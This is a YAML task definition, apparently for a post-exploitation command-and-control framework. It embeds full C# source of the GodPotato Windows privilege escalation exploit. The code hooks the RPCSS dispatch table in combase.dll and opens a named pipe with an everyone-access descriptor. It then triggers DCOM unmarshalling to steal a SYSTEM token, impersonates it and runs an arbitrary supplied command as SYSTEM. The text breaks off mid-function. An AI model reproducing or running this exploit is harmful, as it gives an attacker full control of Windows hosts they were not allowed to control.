- Author:
    Name: amine brahmi
    Handle: khraoverflow
    Link: https://twitter.com/dr_whoami_
  Name: getSystemPotato
  Aliases: []
  Description: godPotato elevating current process to system or optionaly start process with args as system
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: "using System;\nusing System.IO;\nusing GodPotato.NativeAPI;\nusing System.Security.Principal;\nusing SharpToken;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Runtime.ConstrainedExecution;\nusing System.Runtime.InteropServices;\nusing System.Security.Permissions;\nusing System.Text;\nusing System.Threading;\nusing System.Runtime.InteropServices.ComTypes;\n\npublic static class Task\n{\n    static string output = \"\";\n\n    public static string Execute(string cmd)\n    {\n\n        TextWriter ConsoleWriter = Console.Out;\n\n        try\n        {\n            GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());\n\n            output = output + $\"[*] CombaseModule: 0x{0:x}\"+ godPotatoContext.CombaseModule + Environment.NewLine;\n            output = output + output + $\"[*] DispatchTable: 0x{0:x}\" + godPotatoContext.DispatchTablePtr + Environment.NewLine;\n            output = output + $\"[*] UseProtseqFunction: 0x{0:x}\" + godPotatoContext.UseProtseqFunctionPtr + Environment.NewLine;\n            output = output + $\"[*] UseProtseqFunctionParamCount: {0}\" + godPotatoContext.UseProtseqFunctionParamCount + Environment.NewLine;\n\n            output = output + $\"[*] HookRPC\" + Environment.NewLine;\n\n            godPotatoContext.HookRPC();\n            output = output + $\"[*] Start PipeServer\" + Environment.NewLine;\n            godPotatoContext.Start();\n\n            GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);\n            try\n            {\n                output = output + $\"[*] Trigger RPCSS\" + Environment.NewLine;\n                int hr = unmarshalTrigger.Trigger();\n                output = output + $\"[*] UnmarshalObject: 0x{0:x}\" + hr + Environment.NewLine;\n            }\n            catch (Exception e)\n            {\n                output = output + output + e;\n            }\n\n\n            WindowsIdentity systemIdentity = godPotatoContext.GetToken();\n\n            if (systemIdentity != null && systemIdentity.IsSystem)\n            {\n                WindowsIdentity.Impersonate(systemIdentity.Token);\n                output = output + $\"[*] impersonating user: \" + systemIdentity.Name + Environment.NewLine;\n                output = output + $\"[*] current user: \" + WindowsIdentity.GetCurrent().Name + Environment.NewLine;\n\n                if (!string.IsNullOrEmpty(cmd))\n                {\n                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, cmd);\n                    output = output + $\"[*] successuflly executed cmd: \" + cmd + Environment.NewLine;\n                }\n            }\n            else\n            {\n                output = output + output + \"[!] Failed to impersonate security context token\";\n                systemIdentity.Dispose();\n            }\n\n            godPotatoContext.Restore();\n            godPotatoContext.Stop();\n\n        }\n        catch (Exception e)\n        {\n            output = output + output + \"[!] \" + e.Message;\n\n        }\n        return output;\n    }\n}\n\nnamespace GodPotato.NativeAPI\n{\n\n    public enum TowerProtocol : ushort\n    {\n        EPM_PROTOCOL_DNET_NSP = 0x04,\n        EPM_PROTOCOL_OSI_TP4 = 0x05,\n        EPM_PROTOCOL_OSI_CLNS = 0x06,\n        EPM_PROTOCOL_TCP = 0x07,\n        EPM_PROTOCOL_UDP = 0x08,\n        EPM_PROTOCOL_IP = 0x09,\n        EPM_PROTOCOL_NCADG = 0x0a, /* Connectionless RPC */\n        EPM_PROTOCOL_NCACN = 0x0b,\n        EPM_PROTOCOL_NCALRPC = 0x0c, /* Local RPC */\n        EPM_PROTOCOL_UUID = 0x0d,\n        EPM_PROTOCOL_IPX = 0x0e,\n        EPM_PROTOCOL_SMB = 0x0f,\n        EPM_PROTOCOL_NAMED_PIPE = 0x10,\n        EPM_PROTOCOL_NETBIOS = 0x11,\n        EPM_PROTOCOL_NETBEUI = 0x12,\n        EPM_PROTOCOL_SPX = 0x13,\n        EPM_PROTOCOL_NB_IPX = 0x14, /* NetBIOS over IPX */\n        EPM_PROTOCOL_DSP = 0x16, /* AppleTalk Data Stream Protocol */\n        EPM_PROTOCOL_DDP = 0x17, /* AppleTalk Data Datagram Protocol */\n        EPM_PROTOCOL_APPLETALK = 0x18, /* AppleTalk */\n        EPM_PROTOCOL_VINES_SPP = 0x1a,\n        EPM_PROTOCOL_VINES_IPC = 0x1b, /* Inter Process Communication */\n        EPM_PROTOCOL_STREETTALK = 0x1c, /* Vines Streettalk */\n        EPM_PROTOCOL_HTTP = 0x1f,\n        EPM_PROTOCOL_UNIX_DS = 0x20, /* Unix domain socket */\n        EPM_PROTOCOL_NULL = 0x21\n    }\n\n    internal class ObjRef\n    {\n\n        [Flags]\n        enum Type : uint\n        {\n            Standard = 0x1,\n            Handler = 0x2,\n            Custom = 0x4\n        }\n\n        const uint Signature = 0x574f454d;\n        public readonly Guid Guid;\n        public readonly Standard StandardObjRef;\n\n        public ObjRef(Guid guid, Standard standardObjRef)\n        {\n            Guid = guid;\n            StandardObjRef = standardObjRef;\n        }\n\n        public ObjRef(byte[] objRefBytes)\n        {\n\n            BinaryReader br = new BinaryReader(new MemoryStream(objRefBytes), Encoding.Unicode);\n\n            if (br.ReadUInt32() != Signature)\n            {\n                throw new InvalidDataException(\"Does not look like an OBJREF stream\");\n            }\n\n            uint flags = br.ReadUInt32();\n            Guid = new Guid(br.ReadBytes(16));\n\n            if ((Type)flags == Type.Standard)\n            {\n                StandardObjRef = new Standard(br);\n            }\n        }\n\n        public byte[] GetBytes()\n        {\n            BinaryWriter bw = new BinaryWriter(new MemoryStream());\n\n            bw.Write(Signature);\n            bw.Write((uint)1);\n            bw.Write(Guid.ToByteArray());\n\n            StandardObjRef.Save(bw);\n\n            return ((MemoryStream)bw.BaseStream).ToArray();\n        }\n\n        internal class SecurityBinding\n        {\n\n            public readonly ushort AuthnSvc;\n            public readonly ushort AuthzSvc;\n            public readonly string PrincipalName;\n\n            public SecurityBinding(ushort authnSvc, ushort authzSnc, string principalName)\n            {\n                AuthnSvc = authnSvc;\n                AuthzSvc = authzSnc;\n                PrincipalName = principalName;\n            }\n\n            public SecurityBinding(BinaryReader br)\n            {\n\n                AuthnSvc = br.ReadUInt16();\n                AuthzSvc = br.ReadUInt16();\n                char character;\n                string principalName = \"\";\n\n                while ((character = br.ReadChar()) != 0)\n                {\n                    principalName += character;\n                }\n\n                br.ReadChar();\n            }\n\n\n            public byte[] GetBytes()\n            {\n                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);\n\n                bw.Write(AuthnSvc);\n                bw.Write(AuthzSvc);\n\n                if (PrincipalName != null && PrincipalName.Length > 0)\n                    bw.Write(Encoding.Unicode.GetBytes(PrincipalName));\n\n                bw.Write((char)0);\n                bw.Write((char)0);\n\n                return ((MemoryStream)bw.BaseStream).ToArray();\n            }\n        }\n\n        internal class StringBinding\n        {\n            public readonly TowerProtocol TowerID;\n            public readonly string NetworkAddress;\n\n            public StringBinding(TowerProtocol towerID, string networkAddress)\n            {\n                TowerID = towerID;\n                NetworkAddress = networkAddress;\n            }\n\n            public StringBinding(BinaryReader br)\n            {\n                TowerID = (TowerProtocol)br.ReadUInt16();\n                char character;\n                string networkAddress = \"\";\n\n                while ((character = br.ReadChar()) != 0)\n                {\n                    networkAddress += character;\n                }\n\n                br.ReadChar();\n                NetworkAddress = networkAddress;\n            }\n\n            internal byte[] GetBytes()\n            {\n                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);\n\n                bw.Write((ushort)TowerID);\n                bw.Write(Encoding.Unicode.GetBytes(NetworkAddress));\n                bw.Write((char)0);\n                bw.Write((char)0);\n\n                return ((MemoryStream)bw.BaseStream).ToArray();\n            }\n        }\n\n        internal class DualStringArray\n        {\n            private readonly ushort NumEntries;\n            private readonly ushort SecurityOffset;\n            public readonly StringBinding StringBinding;\n            public readonly SecurityBinding SecurityBinding;\n\n            public DualStringArray(StringBinding stringBinding, SecurityBinding securityBinding)\n            {\n                NumEntries = (ushort)((stringBinding.GetBytes().Length + securityBinding.GetBytes().Length) / 2);\n                SecurityOffset = (ushort)(stringBinding.GetBytes().Length / 2);\n\n                StringBinding = stringBinding;\n                SecurityBinding = securityBinding;\n            }\n\n            public DualStringArray(BinaryReader br)\n            {\n                NumEntries = br.ReadUInt16();\n                SecurityOffset = br.ReadUInt16();\n\n                StringBinding = new StringBinding(br);\n                SecurityBinding = new SecurityBinding(br);\n            }\n\n            internal void Save(BinaryWriter bw)\n            {\n\n                byte[] stringBinding = StringBinding.GetBytes();\n                byte[] securityBinding = SecurityBinding.GetBytes();\n\n                bw.Write((ushort)((stringBinding.Length + securityBinding.Length) / 2));\n                bw.Write((ushort)(stringBinding.Length / 2));\n                bw.Write(stringBinding);\n                bw.Write(securityBinding);\n            }\n        }\n\n        internal class Standard\n        {\n\n            const ulong Oxid = 0x0703d84a06ec96cc;\n            const ulong Oid = 0x539d029cce31ac;\n\n            public readonly uint Flags;\n            public readonly uint PublicRefs;\n            public readonly ulong OXID;\n            public readonly ulong OID;\n            public readonly Guid IPID;\n            public readonly DualStringArray DualStringArray;\n\n            public Standard(uint flags, uint publicRefs, ulong oxid, ulong oid, Guid ipid, DualStringArray dualStringArray)\n            {\n                Flags = flags;\n                PublicRefs = publicRefs;\n                OXID = oxid;\n                OID = oid;\n                IPID = ipid;\n                DualStringArray = dualStringArray;\n            }\n\n            public Standard(BinaryReader br)\n            {\n                Flags = br.ReadUInt32();\n                PublicRefs = br.ReadUInt32();\n                OXID = br.ReadUInt64();\n                OID = br.ReadUInt64();\n                IPID = new Guid(br.ReadBytes(16));\n\n                DualStringArray = new DualStringArray(br);\n            }\n\n            internal void Save(BinaryWriter bw)\n            {\n                bw.Write(Flags);\n                bw.Write(PublicRefs);\n                bw.Write(OXID);\n                bw.Write(OID);\n                bw.Write(IPID.ToByteArray());\n                DualStringArray.Save(bw);\n            }\n        }\n    }\n}\n\n\nnamespace GodPotato.NativeAPI\n{\n    internal class UnmarshalDCOM\n    {\n        private readonly static Guid IID_IUnknown = new Guid(\"{00000000-0000-0000-C000-000000000046}\");\n\n        public static int UnmarshalObject(Stream stm, Guid iid, out IntPtr ppv)\n        {\n            return NativeMethods.CoUnmarshalInterface(new IStreamImpl(stm), ref iid, out ppv);\n        }\n\n        public static int UnmarshalObject(byte[] objref, out IntPtr ppv)\n        {\n            return UnmarshalObject(new MemoryStream(objref), IID_IUnknown, out ppv);\n        }\n    }\n}\n\nnamespace GodPotato.NativeAPI\n{\n\n    [ComVisible(true)]\n    public class GodPotatoUnmarshalTrigger\n    {\n        private readonly static Guid IID_IUnknown = new Guid(\"{00000000-0000-0000-C000-000000000046}\");\n        private readonly static string binding = \"127.0.0.1\";\n        private readonly static TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;\n\n\n        public object fakeObject = new object();\n        public IntPtr pIUnknown;\n        public IBindCtx bindCtx;\n        public IMoniker moniker;\n\n        private GodPotatoContext godPotatoContext;\n\n\n        public GodPotatoUnmarshalTrigger(GodPotatoContext godPotatoContext)\n        {\n            this.godPotatoContext = godPotatoContext;\n\n\n            if (!godPotatoContext.IsStart)\n            {\n                throw new Exception(\"GodPotatoContext was not initialized\");\n            }\n\n            pIUnknown = Marshal.GetIUnknownForObject(fakeObject);\n            NativeMethods.CreateBindCtx(0, out bindCtx);\n            NativeMethods.CreateObjrefMoniker(pIUnknown, out moniker);\n\n        }\n\n\n        public int Trigger()\n        {\n\n            string ppszDisplayName;\n            moniker.GetDisplayName(bindCtx, null, out ppszDisplayName);\n            ppszDisplayName = ppszDisplayName.Replace(\"objref:\", \"\").Replace(\":\", \"\");\n            byte[] objrefBytes = Convert.FromBase64String(ppszDisplayName);\n\n            ObjRef tmpObjRef = new ObjRef(objrefBytes);\n\n            ObjRef objRef = new ObjRef(IID_IUnknown,\n                  new ObjRef.Standard(0, 1, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,\n                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));\n            byte[] data = objRef.GetBytes();\n            IntPtr ppv;\n\n            return UnmarshalDCOM.UnmarshalObject(data, out ppv);\n        }\n\n\n    }\n}\n\nnamespace GodPotato.NativeAPI\n{\n    public class IStreamImpl : IStream, IDisposable\n    {\n        private Stream m_stream;\n\n        public IStreamImpl(Stream stream)\n        {\n            m_stream = stream;\n        }\n\n\n        public void Dispose()\n        {\n            m_stream.Dispose();\n        }\n\n        public void Close()\n        {\n            Dispose();\n        }\n\n        public void Clone(out IStream pStm)\n        {\n            throw new NotImplementedException();\n        }\n\n        public void Stat(out System.Runtime.InteropServices.ComTypes.STATSTG statStg, int grfFlags)\n        {\n            statStg = new System.Runtime.InteropServices.ComTypes.STATSTG();\n            statStg.cbSize = m_stream.Length;\n        }\n\n        public void UnlockRegion(long libOffset, long cb, int dwLockType)\n        {\n            throw new NotImplementedException();\n        }\n\n        public void LockRegion(long libOffset, long cb, int dwLockType)\n        {\n            throw new NotImplementedException();\n        }\n\n        public void Revert()\n        {\n            throw new NotImplementedException();\n        }\n\n        public void Commit(int grfCommitFlags)\n        {\n            throw new NotImplementedException();\n        }\n\n        public void CopyTo(IStream pstm, long cb, IntPtr pcbRead, IntPtr pcbWritten)\n        {\n            throw new NotImplementedException();\n        }\n\n        public void SetSize(long lSize)\n        {\n            throw new NotImplementedException();\n        }\n\n        public void Seek(long dlibMove, int dwOrigin, IntPtr plibNewPosition)\n        {\n            SeekOrigin origin;\n\n            switch (dwOrigin)\n            {\n                case 0:\n                    origin = SeekOrigin.Begin;\n                    break;\n                case 1:\n                    origin = SeekOrigin.Current;\n                    break;\n                case 2:\n                    origin = SeekOrigin.End;\n                    break;\n                default: throw new ArgumentException();\n            }\n            m_stream.Seek(dlibMove, origin);\n            if (plibNewPosition != IntPtr.Zero)\n            {\n                Marshal.WriteInt64(plibNewPosition, m_stream.Position);\n            }\n        }\n\n        public void Read(byte[] pv, int cb, IntPtr pcbRead)\n        {\n            int readCount = m_stream.Read(pv, 0, cb);\n            if (pcbRead != IntPtr.Zero)\n            {\n                Marshal.WriteInt32(pcbRead, readCount);\n            }\n        }\n\n        public void Write(byte[] pv, int cb, IntPtr pcbWritten)\n        {\n            m_stream.Write(pv, 0, cb);\n            if (pcbWritten != IntPtr.Zero)\n            {\n                Marshal.WriteInt32(pcbWritten, cb);\n            }\n        }\n    }\n}\n\nnamespace GodPotato.NativeAPI\n{\n\n}\n\nnamespace GodPotato.NativeAPI\n{\n    public class NativeMethods\n    {\n\n        public readonly static IntPtr BAD_HANLE = new IntPtr(-1);\n\n\n        public static readonly uint ERROR_PIPE_CONNECTED = 0x217;\n\n        public static readonly uint HANDLE_FLAG_INHERIT = 0x00000001;\n        public static readonly uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;\n\n        public readonly static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;\n        public readonly static uint TOKEN_ASSIGN_PRIMARY = 0x0001;\n        public readonly static uint TOKEN_DUPLICATE = 0x0002;\n        public readonly static uint TOKEN_IMPERSONATE = 0x0004;\n        public readonly static uint TOKEN_QUERY = 0x0008;\n        public readonly static uint TOKEN_QUERY_SOURCE = 0x0010;\n        public readonly static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;\n        public readonly static uint TOKEN_ADJUST_GROUPS = 0x0040;\n        public readonly static uint TOKEN_ADJUST_DEFAULT = 0x0080;\n        public readonly static uint TOKEN_ADJUST_SESSIONID = 0x0100;\n        public readonly static uint TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;\n\n        public readonly static uint STARTF_FORCEONFEEDBACK = 0x00000040;\n        public readonly static uint STARTF_FORCEOFFFEEDBACK = 0x00000080;\n        public readonly static uint STARTF_PREVENTPINNING = 0x00002000;\n        public readonly static uint STARTF_RUNFULLSCREEN = 0x00000020;\n        public readonly static uint STARTF_TITLEISAPPID = 0x00001000;\n        public readonly static uint STARTF_TITLEISLINKNAME = 0x00000800;\n        public readonly static uint STARTF_UNTRUSTEDSOURCE = 0x00008000;\n        public readonly static uint STARTF_USECOUNTCHARS = 0x00000008;\n        public readonly static uint STARTF_USEFILLATTRIBUTE = 0x00000010;\n        public readonly static uint STARTF_USEHOTKEY = 0x00000200;\n        public readonly static uint STARTF_USEPOSITION = 0x00000004;\n        public readonly static uint STARTF_USESHOWWINDOW = 0x00000001;\n        public readonly static uint STARTF_USESIZE = 0x00000002;\n        public readonly static uint STARTF_USESTDHANDLES = 0x00000100;\n\n\n        public static readonly uint STATUS_SUCCESS = 0x00000000;\n        public static readonly uint ERROR_SUCCESS = 0x00000000;\n\n        public static readonly int SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;\n        public static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;\n        public static readonly int SE_PRIVILEGE_REMOVED = 0X00000004;\n\n        public readonly static int E_NOINTERFACE = unchecked((int)0x80004002);\n        public readonly static int NOERROR = 0;\n\n\n        public readonly static int STGM_CREATE = 0x00001000;\n        public readonly static int STGM_CONVERT = 0x00020000;\n        public readonly static int STGM_FAILIFTHERE = 0x00000000;\n\n        public readonly static int STGM_READ = 0x00000000;\n        public readonly static int STGM_WRITE = 0x00000001;\n        public readonly static int STGM_READWRITE = 0x00000002;\n\n        public readonly static int STGM_SHARE_DENY_NONE = 0x00000040;\n        public readonly static int STGM_SHARE_DENY_READ = 0x00000030;\n        public readonly static int STGM_SHARE_DENY_WRITE = 0x00000020;\n        public readonly static int STGM_SHARE_EXCLUSIVE = 0x00000010;\n\n\n        public static readonly int NMPWAIT_WAIT_FOREVER = unchecked((int)0xffffffff);\n        public static readonly int NMPWAIT_NOWAIT = 0x00000001;\n        public static readonly int NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;\n\n        public static readonly int PIPE_UNLIMITED_INSTANCES = 255;\n\n        public static readonly int PIPE_WAIT = 0x00000000;\n        public static readonly int PIPE_NOWAIT = 0x00000001;\n        public static readonly int PIPE_READMODE_BYTE = 0x00000000;\n        public static readonly int PIPE_READMODE_MESSAGE = 0x00000002;\n        public static readonly int PIPE_TYPE_BYTE = 0x00000000;\n        public static readonly int PIPE_TYPE_MESSAGE = 0x00000004;\n        public static readonly int PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000;\n        public static readonly int PIPE_REJECT_REMOTE_CLIENTS = 0x00000008;\n\n        public static readonly int PIPE_ACCESS_INBOUND = 0x00000001;\n        public static readonly int PIPE_ACCESS_OUTBOUND = 0x00000002;\n        public static readonly int PIPE_ACCESS_DUPLEX = 0x00000003;\n\n\n\n        public static Dictionary<Guid, IntPtr> IIDPTR = new Dictionary<Guid, IntPtr>();\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct SECURITY_ATTRIBUTES\n        {\n            public int nLength;\n            public IntPtr pSecurityDescriptor;\n            public bool bInheritHandle;\n        }\n\n\n        [StructLayout(LayoutKind.Sequential)]\n        internal struct RPC_VERSION\n        {\n            public ushort MajorVersion;\n            public ushort MinorVersion;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        internal struct RPC_SYNTAX_IDENTIFIER\n        {\n            public Guid SyntaxGUID;\n            public RPC_VERSION SyntaxVersion;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        internal struct RPC_SERVER_INTERFACE\n        {\n            public uint Length;\n            public RPC_SYNTAX_IDENTIFIER InterfaceId;\n            public RPC_SYNTAX_IDENTIFIER TransferSyntax;\n            public IntPtr DispatchTable;\n            public uint RpcProtseqEndpointCount;\n            public IntPtr RpcProtseqEndpoint;\n            public IntPtr DefaultManagerEpv;\n            public IntPtr InterpreterInfo;\n            public uint Flags;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct RPC_DISPATCH_TABLE\n        {\n\n            /// unsigned int\n            public uint DispatchTableCount;\n\n            /// RPC_DISPATCH_FUNCTION*\n            public IntPtr DispatchTable;\n\n            /// LONG_PTR->int\n            public int Reserved;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct MIDL_SERVER_INFO\n        {\n            public IntPtr /* PMIDL_STUB_DESC */ pStubDesc;\n            public IntPtr /* SERVER_ROUTINE* */ DispatchTable;\n            public IntPtr /* PFORMAT_STRING */ ProcString;\n            public IntPtr /* unsigned short* */ FmtStringOffset;\n            public IntPtr /* STUB_THUNK * */ ThunkTable;\n            public IntPtr /* PRPC_SYNTAX_IDENTIFIER */ pTransferSyntax;\n            public IntPtr /* ULONG_PTR */ nCount;\n            public IntPtr /* PMIDL_SYNTAX_INFO */ pSyntaxInfo;\n        }\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern bool VirtualProtect([In] IntPtr pBlock, [In] uint size, [In] uint newProtect, [Out] out uint oldProtect);\n        [DllImport(\"Advapi32.dll\", SetLastError = true, CharSet = CharSet.Unicode)]\n        internal static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(string StringSecurityDescriptor, uint StringSDRevision, out IntPtr SecurityDescriptor, out uint SecurityDescriptorSize);\n\n        [DllImport(\"kernel32\")]\n        public static extern void CloseHandle(IntPtr hObject);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool RevertToSelf();\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);\n        [DllImport(\"kernel32.dll\", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = \"CreateNamedPipeW\", SetLastError = true)]\n        public static extern IntPtr CreateNamedPipe(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);\n        [DllImport(\"ole32.dll\")]\n        public static extern int CoUnmarshalInterface(IStream stm, ref Guid riid, out IntPtr ppv);\n\n        [DllImport(\"ole32.dll\", PreserveSig = false, ExactSpelling = true)]\n        public static extern int CreateBindCtx(uint reserved, out IBindCtx ppbc);\n\n        [DllImport(\"ole32.dll\", CharSet = CharSet.Unicode, PreserveSig = false, ExactSpelling = true)]\n        public static extern int CreateObjrefMoniker(IntPtr pUnk, out IMoniker ppMoniker);\n    }\n    public class GodPotatoContext\n    {\n        private static readonly Guid orcbRPCGuid = new Guid(\"18f70770-8e64-11cf-9af1-0020af6e72f4\");\n        public IntPtr CombaseModule { get; private set; }\n        public IntPtr DispatchTablePtr { get; private set; }\n        public IntPtr UseProtseqFunctionPtr { get; private set; } = IntPtr.Zero;\n        public uint UseProtseqFunctionParamCount { get; private set; } = 0xffffff;\n\n        private NewOrcbRPC newOrcbRPC;\n        private IntPtr[] dispatchTable = null;\n        private short[] fmtStringOffsetTable = null;\n        private IntPtr procString = IntPtr.Zero;\n        private Delegate useProtseqDelegate;\n        private WindowsIdentity systemIdentity;\n        private Thread pipeServerThread;\n        public TextWriter ConsoleWriter { get; private set; }\n        public string PipeName { get; set; }\n        public bool IsStart { get; private set; }\n        public bool IsHook { get; private set; }\n        public readonly string serverPipe = $\"\\\\\\\\.\\\\pipe\\\\{\"GodPotato\"}\\\\pipe\\\\epmapper\";\n        public readonly string clientPipe = $\"ncacn_np:localhost/pipe/{\"GodPotato\"}[\\\\pipe\\\\epmapper]\";\n\n        public GodPotatoContext(TextWriter consoleWriter, string pipeName)\n        {\n            this.PipeName = pipeName;\n            this.newOrcbRPC = new NewOrcbRPC(this);\n            this.ConsoleWriter = consoleWriter;\n\n            InitContext();\n\n            if (CombaseModule == IntPtr.Zero)\n            {\n                throw new Exception(\"No combase module found\");\n            }\n            else if (dispatchTable == null || procString == IntPtr.Zero || UseProtseqFunctionPtr == IntPtr.Zero)\n            {\n                throw new Exception(\"Cannot find IDL structure\");\n            }\n\n\n            /*\n            \n            string delegateFunName = \"delegateFun\" + UseProtseqFunctionParamCount;\n            string funName = \"fun\" + UseProtseqFunctionParamCount;\n\n            Type delegateFunType = typeof(NewOrcbRPC).GetNestedType(delegateFunName, System.Reflection.BindingFlags.Public);\n            this.useProtseqDelegate = Delegate.CreateDelegate(delegateFunType, newOrcbRPC, funName);\n            \n             */\n\n\n\n            // Code obfuscation support\n            else if (UseProtseqFunctionParamCount == 4)\n            {\n                NewOrcbRPC.delegateFun4 df4 = newOrcbRPC.fun4;\n                useProtseqDelegate = df4;\n            }\n            else if (UseProtseqFunctionParamCount == 5)\n            {\n                NewOrcbRPC.delegateFun5 df5 = newOrcbRPC.fun5;\n                useProtseqDelegate = df5;\n            }\n            else if (UseProtseqFunctionParamCount == 6)\n            {\n                NewOrcbRPC.delegateFun6 df6 = newOrcbRPC.fun6;\n                useProtseqDelegate = df6;\n            }\n            else if (UseProtseqFunctionParamCount == 7)\n            {\n                NewOrcbRPC.delegateFun7 df7 = newOrcbRPC.fun7;\n                useProtseqDelegate = df7;\n            }\n            else if (UseProtseqFunctionParamCount == 8)\n            {\n                NewOrcbRPC.delegateFun8 df8 = newOrcbRPC.fun8;\n                useProtseqDelegate = df8;\n            }\n            else if (UseProtseqFunctionParamCount == 9)\n            {\n                NewOrcbRPC.delegateFun9 df9 = newOrcbRPC.fun9;\n                useProtseqDelegate = df9;\n            }\n            else if (UseProtseqFunctionParamCount == 10)\n            {\n                NewOrcbRPC.delegateFun10 df10 = newOrcbRPC.fun10;\n                useProtseqDelegate = df10;\n            }\n            else if (UseProtseqFunctionParamCount == 11)\n            {\n                NewOrcbRPC.delegateFun11 df11 = newOrcbRPC.fun11;\n                useProtseqDelegate = df11;\n            }\n            else if (UseProtseqFunctionParamCount == 12)\n            {\n                NewOrcbRPC.delegateFun12 df12 = newOrcbRPC.fun12;\n                useProtseqDelegate = df12;\n            }\n            else if (UseProtseqFunctionParamCount == 13)\n            {\n                NewOrcbRPC.delegateFun13 df13 = newOrcbRPC.fun13;\n                useProtseqDelegate = df13;\n            }\n            else if (UseProtseqFunctionParamCount == 14)\n            {\n                NewOrcbRPC.delegateFun14 df14 = newOrcbRPC.fun14;\n                useProtseqDelegate = df14;\n            }\n            else\n            {\n                throw new Exception($\"UseProtseqFunctionParamCount == ${UseProtseqFunctionParamCount}\");\n\n            }\n\n\n        }\n\n        protected void InitContext()\n        {\n            ProcessModuleCollection processModules = Process.GetCurrentProcess().Modules;\n            foreach (ProcessModule processModule in processModules)\n            {\n                if (processModule.ModuleName != null && processModule.ModuleName.ToLower() == \"combase.dll\")\n                {\n                    CombaseModule = processModule.BaseAddress;\n\n                    MemoryStream patternStream = new MemoryStream();\n\n                    BinaryWriter binaryWriter = new BinaryWriter(patternStream);\n                    binaryWriter.Write(Marshal.SizeOf(typeof(NativeMethods.RPC_SERVER_INTERFACE)));\n                    binaryWriter.Write(orcbRPCGuid.ToByteArray());\n                    binaryWriter.Flush();\n\n                    byte[] dllContent = new byte[processModule.ModuleMemorySize];\n                    Marshal.Copy(processModule.BaseAddress, dllContent, 0, dllContent.Length);\n\n                    var s = Sunday.Search(dllContent, patternStream.ToArray());\n\n\n                    NativeMethods.RPC_SERVER_INTERFACE rpcServerInterface = (NativeMethods.RPC_SERVER_INTERFACE)Marshal.PtrToStructure(new IntPtr(processModule.BaseAddress.ToInt64() + s[0]), typeof(NativeMethods.RPC_SERVER_INTERFACE));\n                    NativeMethods.RPC_DISPATCH_TABLE rpcDispatchTable = (NativeMethods.RPC_DISPATCH_TABLE)Marshal.PtrToStructure(rpcServerInterface.DispatchTable, typeof(NativeMethods.RPC_DISPATCH_TABLE));\n                    NativeMethods.MIDL_SERVER_INFO midlServerInfo = (NativeMethods.MIDL_SERVER_INFO)Marshal.PtrToStructure(rpcServerInterface.InterpreterInfo, typeof(NativeMethods.MIDL_SERVER_INFO));\n                    DispatchTablePtr = midlServerInfo.DispatchTable;\n                    IntPtr fmtStringOffsetTablePtr = midlServerInfo.FmtStringOffset;\n                    procString = midlServerInfo.ProcString;\n                    dispatchTable = new IntPtr[rpcDispatchTable.DispatchTableCount];\n                    fmtStringOffsetTable = new short[rpcDispatchTable.DispatchTableCount];\n\n                    for (int i = 0; i < dispatchTable.Length; i++)\n                    {\n                        dispatchTable[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);\n                    }\n\n                    for (int i = 0; i < fmtStringOffsetTable.Length; i++)\n                    {\n                        fmtStringOffsetTable[i] = Marshal.ReadInt16(fmtStringOffsetTablePtr, i * Marshal.SizeOf(typeof(short)));\n                    }\n                    UseProtseqFunctionPtr = dispatchTable[0];\n                    UseProtseqFunctionParamCount = Marshal.ReadByte(procString, fmtStringOffsetTable[0] + 19);\n                }\n            }\n\n        }\n\n        protected void PipeServer()\n        {\n            IntPtr pipeServerHandle = NativeMethods.BAD_HANLE;\n\n            IntPtr securityDescriptor;\n            uint securityDescriptorSize;\n\n            NativeMethods.ConvertStringSecurityDescriptorToSecurityDescriptor(\"D:(A;OICI;GA;;;WD)\", 1, out securityDescriptor, out securityDescriptorSize);\n\n            try\n            {\n\n                NativeMethods.SECURITY_ATTRIBUTES securityAttributes = new NativeMethods.SECURITY_ATTRIBUTES();\n                securityAttributes.pSecurityDescriptor = securityDescriptor;\n                securityAttributes.nLength = Marshal.SizeOf(typeof(NativeMethods.SECURITY_ATTRIBUTES));\n                pipeServerHandle = NativeMethods.CreateNamedPipe(serverPipe, 